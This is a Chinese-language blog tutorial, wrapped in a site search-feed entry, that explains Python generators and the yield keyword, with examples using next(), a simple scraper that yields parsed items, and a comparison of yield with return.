        <content type="html"><![CDATA[<p>讲到yield就要先说一下生成器：在Python中，一边循环一边计算的机制，称为生成器：generator。<br>也就是说，它并不是一回计算货创建出所有目标，而是有需要的适合再计算创建，作用就是减少内存占用。</p><h1 id="创建生成器"><a href="#创建生成器" class="headerlink" title="创建生成器"></a>创建生成器</h1><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>把一个列表生成式的[]改成()：</p><pre><code>&gt;&gt;&gt; L = [x * x for x in range(10)]&gt;&gt;&gt; L[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]&gt;&gt;&gt; g = (x * x for x in range(10))&gt;&gt;&gt; g&lt;generator object &lt;genexpr&gt; at 0x1022ef630&gt;</code></pre><p>可以看出L是一个list，而g是一个generator<br>可以通过next()函数获得g的下一个返回值：</p><pre><code>&gt;&gt;&gt; next(g)0&gt;&gt;&gt; next(g)1&gt;&gt;&gt; next(g)4&gt;&gt;&gt; next(g)9</code></pre><p>或者直接利用循环：</p><pre><code>&gt;&gt;&gt; for n in g:...     print(n)... 0149162536496481</code></pre><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>在函数中使用yield，如果一个函数中包含yield关键字，那么这个函数就不再是一个普通函数，而是一个generator。调用函数就是创建了一个生成器（generator）对象。</p><h1 id="关键字yield"><a href="#关键字yield" class="headerlink" title="关键字yield"></a>关键字yield</h1><p>yield相当于 return 返回一个值，并且记住这个返回的位置，下次迭代时，代码从yield的下一条语句开始执行。<br>我们可以暂时将它理解为return，当程序遇到他时返回特定值，然后程序暂停运行。</p><h2 id="EX"><a href="#EX" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果：</p><blockquote><p>3</p></blockquote><p>那我们在加一个<code>print(next(a))</code>呢</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token number">3</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">)</span>a<span class="token operator">=</span>test<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>next<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>运行结果</p><blockquote><p>3<br>test<br>3</p></blockquote><p>结果符合上面描述</p><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><p>当我们处理数据时，生成器就用的比较多了<br>比如我们写一个爬虫，返回处理后的数据保存为文件时，就可以使用生成器，利用循环依次返回并写入数据</p><h2 id="EX-1"><a href="#EX-1" class="headerlink" title="EX:"></a>EX:</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#解析数据函数</span><span class="token keyword">def</span> <span class="token function">parse_result</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">:</span>    items <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>html<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">yield</span> <span class="token punctuation">{</span>            <span class="token string">'1'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'2'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>            <span class="token string">'3'</span><span class="token punctuation">:</span> item<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span><span class="token keyword">def</span> <span class="token function">write_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#省略函数内容</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#请求</span>items1 <span class="token operator">=</span> parse_result<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#调用解析函数</span><span class="token comment" spellcheck="true">#main（）区</span><span class="token keyword">for</span> item <span class="token keyword">in</span> items1<span class="token punctuation">:</span>    write_file<span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#将内容写入文件</span></code></pre><p>items1是一个生成器，在main（）区中通过for循环一步步返回数据到item中，然后载写入文件中<br>若把yield换成return就不可行了，return返回一次函数就结束了。</p><h4 id="return与yield的区别："><a href="#return与yield的区别：" class="headerlink" title="return与yield的区别："></a>return与yield的区别：</h4><blockquote><p>1，return只能返回一次函数就彻底结束了。而yield能返回多次值。<br>2，yield把函数变成生成器—迭代器—&gt;把iter，next方法给到函数了。为我们自己定义迭代器，提供了方便。<br>3，yield能保存函数在暂停，和继续下一次运行的状态。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
